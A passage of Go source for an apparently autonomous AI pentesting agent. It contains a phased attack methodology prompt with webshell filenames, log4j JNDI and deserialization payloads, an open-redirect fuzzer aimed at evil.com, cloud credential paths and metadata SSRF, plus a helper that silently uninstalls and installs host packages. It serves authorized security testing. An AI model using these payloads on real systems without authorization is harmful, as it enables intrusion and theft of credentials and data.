### PHASE 10: File Upload Testing
- If file upload exists, test:
  - PHP shell: shell.php, shell.pHp, shell.php5, shell.phtml, shell.php.jpg
  - Double extension: shell.php.jpg, shell.jpg.php
  - Null byte: shell.php%00.jpg
  - Content-Type bypass: upload .php with image/jpeg Content-Type
  - SVG with XSS: <svg onload=alert(1)>
  - PDF with JS: embedded JavaScript in PDF
  - .htaccess upload to enable PHP execution
  - Polyglot files (valid image + valid PHP)
  - Path traversal in filename: ../../../var/www/html/shell.php

### PHASE 11: Deserialization & RCE
- Test for Java deserialization (ysoserial payloads)
- Test for PHP object injection (O:4:"Test":0:{})
- Test for Python pickle deserialization
- Test for Node.js prototype pollution ({"__proto__": {"isAdmin": true}})
- Test for .NET ViewState deserialization
- Test log4j: ${jndi:ldap://COLLAB/test} in User-Agent, X-Forwarded-For, Referer

### PHASE 12: Race Conditions & Business Logic
- Test for TOCTOU bugs on payment/transfer endpoints
- Test concurrent requests to same endpoint (coupon reuse, double spending)
- Test for mass assignment: add admin=true, role=admin to registration/update requests
- Test for price manipulation in e-commerce
- Test for negative quantity/amount values
- Test for rate limiting bypass on sensitive endpoints

### PHASE 13: Subdomain Takeover
` + "`" + `bash` + "`" + `
# Check for dangling CNAME records
cat ./all_subdomains.txt | while read sub; do
  cname=$(dig CNAME "$sub" +short)
  if [ -n "$cname" ]; then
    host "$cname" >/dev/null 2>&1 || echo "[POTENTIAL TAKEOVER] $sub -> $cname (NXDOMAIN)"
  fi
done

# Or use subjack/subzy
subjack -w ./all_subdomains.txt -t RATE_LIMIT -timeout 30 -ssl -o ./takeovers.txt 2>/dev/null
` + "`" + `

### PHASE 14: Open Redirect Testing
` + "`" + `python` + "`" + `
import requests
redirect_params = ['next','url','target','rurl','dest','destination','redir','redirect_url',
                   'redirect_uri','redirect','return','return_to','returnTo','continue',
                   'go','checkout_url','forward','location','to','out','view','ref','login_url']
payloads = ['//evil.com', 'https://evil.com', '//evil.com%2f%2f', '////evil.com',
            'https:evil.com', '//evil%E3%80%82com', '/%0d/evil.com', '/.evil.com']
for param in redirect_params:
    for payload in payloads:
        try:
            r = requests.get(f'https://TARGET/?{param}={payload}', verify=False, timeout=5, allow_redirects=False)
            loc = r.headers.get('Location', '')
            if 'evil.com' in loc:
                print(f'[VULN] Open Redirect: ?{param}={payload} -> {loc}')
        except: pass
` + "`" + `

### PHASE 15: Email Security Testing
⚠️ SPF/DKIM/DMARC misconfigurations are OUT OF SCOPE on HackerOne. DO NOT report them.
⚠️ The report_vulnerability tool will REJECT any SPF/DMARC/DKIM findings.

**Instead, focus on exploitable email vulnerabilities:**
- Email header injection in contact/registration forms (read_skill name="email_header_injection")
- Password reset token prediction or leak via Referer header
- Host header poisoning in password reset emails (read_skill name="host_header_attacks")
- Account takeover via email change without re-authentication

### PHASE 16: Cloud & Infrastructure
- Test for S3 bucket misconfiguration: TARGET.s3.amazonaws.com, s3.amazonaws.com/TARGET
- Test for Azure blob: TARGET.blob.core.windows.net
- Test for GCP storage: storage.googleapis.com/TARGET
- Check /.aws/credentials, /.docker/config.json, /etc/kubernetes/
- Test for Kubernetes API: /api, /api/v1, /apis, /healthz
- Test for Docker API: /version, /containers/json, /images/json
- Test AWS metadata SSRF: 169.254.169.254

### PHASE 17: WebSocket Testing
- If WebSocket endpoints exist, test for:
  - Cross-site WebSocket hijacking (CSWSH)
  - Injection via WebSocket messages
  - Authentication bypass on WebSocket connections
  - Message tampering

### PHASE 18: CMS-Specific Testing
` + "`" + `bash` + "`" + `
# WordPress
wpscan --url https://TARGET --enumerate vp,vt,u,dbe,cb,m --random-user-agent -o ./wpscan.txt 2>/dev/null
# Joomla
joomscan -u https://TARGET -ec 2>/dev/null
# Drupal
droopescan scan drupal -u https://TARGET 2>/dev/null
` + "`" + `

### PHASE 19: Broken Link Hijacking & Content Spoofing
- Check external links on the site for dead domains you can register
- Test for HTML injection in user inputs
- Test for content spoofing via URL parameters

### PHASE 20: EXPLOIT VERIFICATION (MANDATORY before Phase 22)
⚠️ DO NOT SKIP THIS PHASE. The report_vulnerability tool WILL REJECT reports without proof.

For EVERY potential vulnerability found in previous phases:

**Step 1: Confirm** — Is this real or a false positive?
- Scanner-only findings MUST be manually verified
- Missing headers are NOT vulnerabilities (INFO at best)
- CORS alone without cookie theft proof = INFO
- Open redirect without chaining = INFO
- Version disclosure without CVE exploit = INFO

**Step 2: Exploit it safely** — Produce concrete proof:
- SQLi: Extract actual data (sqlmap --dump) or confirm with time-based (SLEEP)
- XSS: curl the URL with payload, grep for reflected payload in response
- SSRF: Trigger callback or read internal metadata (169.254.169.254)
- RCE: Execute ` + "`" + `id` + "`" + ` or ` + "`" + `whoami` + "`" + `, show output
- IDOR: Access another user's data, show the response
- LFI: Read /etc/passwd, show contents
- Auth bypass: Access protected resource without creds

**Step 3: Self-critique** — Before reporting, ask:
1. "Did I actually exploit this, or just detect it?"
2. "Could this be a false positive?"
3. "Is my proof concrete enough for another pentester?"
4. "Am I using the right severity?"

**Safe exploitation rules:**
- NEVER delete data, drop tables, or modify production state
- Use READ-ONLY exploitation only
- Time-based tests are always safe

### PHASE 21: Zero-Day & Novel Vulnerability Discovery
Go beyond known CVEs. Use behavioral fuzzing and anomaly detection to find vulnerabilities with no public advisory.

**MANDATORY: Load the zero-day research skills first:**
1. read_skill(name="zero-day-hunting")
2. read_skill(name="response-anomaly-detection")

**Step 1: Select High-Value Targets**
- Review your notes from ALL previous phases
- Identify the top 5-10 parameters/endpoints that showed ANY anomaly: partial reflection, unusual errors, non-standard status codes, timing variations, unexpected response sizes
- Prioritize: complex parsers (file upload, JSON/XML/YAML), state-changing ops (payment, registration), multi-component boundaries (CDN→WAF→app)

**Step 2: Behavioral Differential Fuzzing**
- For each selected parameter, establish a response baseline (size, timing, hash, status)
- Run systematic mutations: type confusion (arrays, objects, booleans, null, integers), encoding differentials (double URL-encode, overlong UTF-8, null bytes, zero-width chars), boundary values (empty, MAX_INT, overflow, format strings, regex bombs)
- Flag ANY response where status/size/timing/content deviates from baseline

**Step 3: Parser Differential Testing**
- Test path confusion against WAF/CDN (semicolons, double slashes, URL-encoded paths, case changes, null bytes)
- Test HTTP method confusion (does PUT/PATCH/DELETE bypass WAF rules that only check GET/POST?)
- Test Content-Type confusion (send JSON body with XML Content-Type and vice versa)
- Test header-based routing overrides (X-Original-URL, X-Rewrite-URL, X-Forwarded-Prefix)

**Step 4: Type Confusion & State Machine Attacks**
- Test JSON type juggling on EVERY API endpoint (boolean true as password, null as required field, NoSQL operators)
- Test PHP type juggling (magic hashes 0e215962017, array vs string comparison)
- Test multi-step workflow violations (skip steps, replay steps, reverse order, modify state tokens between steps)
- Test token/nonce reuse (use OTP/CSRF/reset token twice)

**Step 5: Timing Side-Channel Analysis**
- For authentication endpoints: does response time differ for valid vs invalid usernames?
- For comparison endpoints: does processing time correlate with input correctness (character-by-character oracle)?
- Measure 5+ times per mutation, calculate mean and standard deviation, flag >3 sigma deviations

**Step 6: Anomaly Investigation**
- For EVERY anomaly detected: investigate WHY it happens, don't just log it
- Reproduce at least 3 times to rule out flakiness
- Determine if the anomaly is exploitable — can you extract data, bypass auth, execute code?
- Attempt to chain anomalies: error leak + SSRF, type confusion + auth bypass, parser differential + injection

**Safe exploitation rules apply:** NEVER delete data, drop tables, or modify production state.

---

### PHASE 22: Final Report
- Review ALL notes (read_notes with key=all)
- For EVERY verified finding, call report_vulnerability with:
  - exploitation_proof: PASTE THE ACTUAL EXPLOITATION OUTPUT
  - verification_method: how you confirmed (exploited, time_based, data_extracted, callback_received, error_based, blind_confirmed, reflected, authenticated, manual_verified)
  - Accurate severity based on ACTUAL IMPACT (not theoretical)
  - CVSS score
  - Reproducible PoC (exact curl command or script)
  - Remediation steps
- DEDUPLICATION: Only deduplicate findings inside this current scan run. Previous scans and old reports do not count. Same endpoint + same vuln in this scan = skip. Same vuln across endpoints = report best one.
- Call finish with a complete summary: targets, vulns by severity, and remediation priorities.
`

// buildClosingInstruction returns the final instruction appended to the system prompt.
// When the user provides custom instructions mentioning specific vulnerability classes,
// the agent skips full recon and immediately loads the relevant skill + attacks.
func (a *Agent) buildClosingInstruction(instruction string) string {
	if instruction == "" {
		return "START with Phase 1 recon. After each phase, review your notes, identify gaps, and test deeper. After recon, call list_skills and load relevant skills before vulnerability testing!"
	}

	// Detect specific vulnerability classes in the custom instruction
	lower := strings.ToLower(instruction)

	// Build targeted skill loading suggestions
	var skillHints []string

	if strings.Contains(lower, "xss") || strings.Contains(lower, "cross-site scripting") || strings.Contains(lower, "angularjs") || strings.Contains(lower, "angular") || strings.Contains(lower, "sandbox escape") {
		skillHints = append(skillHints, "read_skill(name=\"xss\")", "read_skill(name=\"dom-xss\")")
	}
	if strings.Contains(lower, "sql") || strings.Contains(lower, "sqli") || strings.Contains(lower, "injection") {
		skillHints = append(skillHints, "read_skill(name=\"sql-injection\")")
	}
	if strings.Contains(lower, "smuggl") || strings.Contains(lower, "desync") || strings.Contains(lower, "cl.te") || strings.Contains(lower, "te.cl") {
		skillHints = append(skillHints, "read_skill(name=\"http-request-smuggling\")")
	}
	if strings.Contains(lower, "ssti") || strings.Contains(lower, "template injection") || strings.Contains(lower, "server-side template") {
		skillHints = append(skillHints, "read_skill(name=\"ssti\")")
	}
	if strings.Contains(lower, "template") && !strings.Contains(lower, "ssti") {
		skillHints = append(skillHints, "read_skill(name=\"xss\")", "read_skill(name=\"ssti\")")
	}
	if strings.Contains(lower, "prototype") || strings.Contains(lower, "pollution") || strings.Contains(lower, "__proto__") {
		skillHints = append(skillHints, "read_skill(name=\"prototype-pollution\")")
	}
	if strings.Contains(lower, "cache") || strings.Contains(lower, "poisoning") {
		skillHints = append(skillHints, "read_skill(name=\"cache-poisoning\")")
	}
	if strings.Contains(lower, "deserializ") || strings.Contains(lower, "gadget") || strings.Contains(lower, "ysoserial") {
		skillHints = append(skillHints, "read_skill(name=\"insecure-deserialization\")")
	}
	if strings.Contains(lower, "ssrf") {
		skillHints = append(skillHints, "read_skill(name=\"ssrf\")")
	}
	if strings.Contains(lower, "oauth") || strings.Contains(lower, "openid") {
		skillHints = append(skillHints, "read_skill(name=\"oauth2-attacks\")")
	}
	if strings.Contains(lower, "race") || strings.Contains(lower, "toctou") {
		skillHints = append(skillHints, "read_skill(name=\"race-conditions\")")
	}
	if strings.Contains(lower, "csrf") {
		skillHints = append(skillHints, "read_skill(name=\"csrf\")")
	}
	if strings.Contains(lower, "xxe") || strings.Contains(lower, "xml") {
		skillHints = append(skillHints, "read_skill(name=\"xxe\")")
	}
	if strings.Contains(lower, "nosql") || strings.Contains(lower, "mongo") {
		skillHints = append(skillHints, "read_skill(name=\"nosql-injection\")")
	}
	if strings.Contains(lower, "cors") {
		skillHints = append(skillHints, "read_skill(name=\"cors-exploitation\")")
	}
	if strings.Contains(lower, "websocket") {
		skillHints = append(skillHints, "read_skill(name=\"websocket-hijacking\")")
	}
	if strings.Contains(lower, "csp") {
		skillHints = append(skillHints, "read_skill(name=\"xss\")")
	}
	if strings.Contains(lower, "dom") && (strings.Contains(lower, "clobber") || strings.Contains(lower, "xss")) {
		skillHints = append(skillHints, "read_skill(name=\"dom-xss\")")
	}
	if strings.Contains(lower, "idor") || strings.Contains(lower, "access control") || strings.Contains(lower, "broken access") || strings.Contains(lower, "bola") || strings.Contains(lower, "insecure direct object") {
		skillHints = append(skillHints, "read_skill(name=\"idor\")")
	}
	if strings.Contains(lower, "jwt") || strings.Contains(lower, "json web token") || strings.Contains(lower, "algorithm confusion") || strings.Contains(lower, "kid") || strings.Contains(lower, "jku") {
		skillHints = append(skillHints, "read_skill(name=\"authentication-jwt\")")
	}
	if strings.Contains(lower, "clickjack") || strings.Contains(lower, "click jack") || strings.Contains(lower, "ui redress") || strings.Contains(lower, "x-frame-options") {
		skillHints = append(skillHints, "read_skill(name=\"clickjacking\")")
	}
	if strings.Contains(lower, "llm") || strings.Contains(lower, "prompt injection") || strings.Contains(lower, "chatbot") || strings.Contains(lower, "ai assistant") {
		skillHints = append(skillHints, "read_skill(name=\"web-llm-attacks\")")
	}
	if strings.Contains(lower, "cache deception") || (strings.Contains(lower, "cache") && strings.Contains(lower, "deception")) {
		skillHints = append(skillHints, "read_skill(name=\"web-cache-deception\")")
	}
	if strings.Contains(lower, "file upload") || strings.Contains(lower, "upload") || strings.Contains(lower, "webshell") {
		skillHints = append(skillHints, "read_skill(name=\"insecure-file-uploads\")")
	}
	if strings.Contains(lower, "host header") {
		skillHints = append(skillHints, "read_skill(name=\"host-header-attacks\")")
	}
	if strings.Contains(lower, "graphql") {
		skillHints = append(skillHints, "read_skill(name=\"graphql-advanced\")")
	}
	if strings.Contains(lower, "path traversal") || strings.Contains(lower, "directory traversal") || strings.Contains(lower, "lfi") || strings.Contains(lower, "rfi") {
		skillHints = append(skillHints, "read_skill(name=\"path-traversal-lfi-rfi\")")
	}
	if strings.Contains(lower, "command injection") || strings.Contains(lower, "os command") || strings.Contains(lower, "rce") {
		skillHints = append(skillHints, "read_skill(name=\"rce\")")
	}
	if strings.Contains(lower, "information disclosure") || strings.Contains(lower, "info disclosure") {
		skillHints = append(skillHints, "read_skill(name=\"information-disclosure\")")
	}
	if strings.Contains(lower, "business logic") {
		skillHints = append(skillHints, "read_skill(name=\"business-logic\")")
	}
	if strings.Contains(lower, "2fa") || strings.Contains(lower, "mfa") || strings.Contains(lower, "two-factor") || strings.Contains(lower, "multi-factor") {
		skillHints = append(skillHints, "read_skill(name=\"2fa-mfa-bypass\")")
	}
	if strings.Contains(lower, "password reset") || strings.Contains(lower, "forgot password") || strings.Contains(lower, "reset password") || strings.Contains(lower, "reset token") {
		skillHints = append(skillHints, "read_skill(name=\"host-header-attacks\")")
	}
	if strings.Contains(lower, "http/2") || strings.Contains(lower, "http2") || strings.Contains(lower, "single-packet") || strings.Contains(lower, "h2.") {
		skillHints = append(skillHints, "read_skill(name=\"race-conditions\")", "read_skill(name=\"http-request-smuggling\")")
	}
	if strings.Contains(lower, "auth bypass") || strings.Contains(lower, "authentication bypass") || strings.Contains(lower, "broken auth") || strings.Contains(lower, "login bypass") {
		skillHints = append(skillHints, "read_skill(name=\"authentication-jwt\")", "read_skill(name=\"oauth2-attacks\")", "read_skill(name=\"2fa-mfa-bypass\")")
	}
	if strings.Contains(lower, "api testing") || strings.Contains(lower, "api test") || strings.Contains(lower, "api security") || strings.Contains(lower, "rest api") {
		skillHints = append(skillHints, "read_skill(name=\"idor\")", "read_skill(name=\"broken-function-level-authorization\")", "read_skill(name=\"nosql-injection\")")
	}
	if strings.Contains(lower, "privilege escalation") || strings.Contains(lower, "privesc") || strings.Contains(lower, "vertical escalation") || strings.Contains(lower, "horizontal escalation") {
		skillHints = append(skillHints, "read_skill(name=\"idor\")", "read_skill(name=\"broken-function-level-authorization\")")
	}
	if strings.Contains(lower, "clobbering") && !strings.Contains(lower, "dom") {
		skillHints = append(skillHints, "read_skill(name=\"dom-xss\")")
	}
	if strings.Contains(lower, "zero-day") || strings.Contains(lower, "zero day") || strings.Contains(lower, "0day") || strings.Contains(lower, "0-day") || strings.Contains(lower, "novel vuln") || strings.Contains(lower, "unknown vuln") || strings.Contains(lower, "behavioral fuzz") || strings.Contains(lower, "mutation fuzz") || strings.Contains(lower, "smart fuzz") || strings.Contains(lower, "anomaly hunt") || strings.Contains(lower, "behavioral analysis") || strings.Contains(lower, "parser differential") {
		skillHints = append(skillHints, "read_skill(name=\"zero-day-hunting\")", "read_skill(name=\"response-anomaly-detection\")")
	}

	if len(skillHints) > 0 {
		// Deduplicate
		seen := map[string]bool{}
		var unique []string
		for _, h := range skillHints {
			if !seen[h] {
				seen[h] = true
				unique = append(unique, h)
			}
		}
		return fmt.Sprintf(`## PRIORITY: CUSTOM INSTRUCTIONS DETECTED

The user has given you SPECIFIC instructions about what to test. Follow them as your TOP PRIORITY.

**MANDATORY FIRST STEPS:**
1. Load the relevant deep knowledge skills IMMEDIATELY: %s
2. Do quick recon (technology fingerprinting with curl -sI, identify framework/version) — spend MAX 2-3 iterations on recon
3. Then IMMEDIATELY start testing for the specific vulnerability class described in the instructions
4. Use the EXACT payloads and techniques from the loaded skills
5. DO NOT waste time on full subdomain enumeration, port scanning, or directory brute-forcing unless the custom instructions require it

**Your custom instructions are your MISSION. The default methodology is secondary.**

After addressing the custom instructions, if time permits, continue with the standard assessment methodology.`, strings.Join(unique, ", "))
	}

	// Generic custom instruction — still prioritize it but include standard methodology
	return `## PRIORITY: CUSTOM INSTRUCTIONS DETECTED

The user has given you SPECIFIC instructions. Follow them as your TOP PRIORITY.

**MANDATORY FIRST STEPS:**
1. Call list_skills to see available knowledge, then load relevant skills for the target's technology stack
2. Do quick recon (technology fingerprinting) — spend MAX 3-4 iterations
3. Then focus on what the user asked you to test
4. Load relevant skills BEFORE testing any vulnerability class

After addressing the custom instructions, continue with standard methodology.

START with a quick technology fingerprint (curl -sI, whatweb), then load relevant skills and start testing.`
}

func (a *Agent) buildInitialUserMessage(targets []string, instruction string) string {
	if instruction != "" {
		return fmt.Sprintf("Your PRIMARY MISSION: %s\n\nTarget(s): %s\n\nStart by loading the relevant skills (read_skill), doing a quick technology fingerprint (curl -sI), then immediately focus on the vulnerability class described in your mission. Use the terminal_execute tool to start.", instruction, strings.Join(targets, ", "))
	}
	return fmt.Sprintf("Begin security assessment of: %s\nUse the terminal_execute tool to start.", strings.Join(targets, ", "))
}

func truncStr(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

var httpxFixOnce sync.Once

// fixHttpxConflict detects and removes Python's httpx if it shadows ProjectDiscovery's httpx.
func fixHttpxConflict() {
	httpxFixOnce.Do(func() {
		// Check if httpx exists
		httpxPath, err := exec.LookPath("httpx")
		if err != nil {
			return // httpx not installed at all, will be installed later
		}

		// Check if it's Python's httpx by running --version
		out, err := exec.Command(httpxPath, "--version").CombinedOutput()
		if err != nil {
			return // Can't determine, skip
		}

		output := strings.ToLower(string(out))
		if strings.Contains(output, "python") || strings.Contains(output, "httpx/0.") {
			log.Println("⚠️  Detected Python httpx interfering with ProjectDiscovery httpx — removing it...")

			// Try removing Python httpx
			for _, pip := range []string{"pip3", "pip", "pipx"} {
				if _, err := exec.LookPath(pip); err == nil {
					cmd := exec.Command(pip, "uninstall", "httpx", "-y")
					if out, err := cmd.CombinedOutput(); err != nil {
						log.Printf("Failed to uninstall Python httpx via %s: %s", pip, string(out))
					}
				}
			}

			// Install ProjectDiscovery httpx
			cmd := exec.Command("go", "install", "-v", "github.com/projectdiscovery/httpx/cmd/httpx@latest")
			if out, err := cmd.CombinedOutput(); err != nil {
				log.Printf("Failed to install ProjectDiscovery httpx: %s", string(out))
			} else {
				log.Println("✅ Replaced Python httpx with ProjectDiscovery httpx")
			}
		}
	})
}
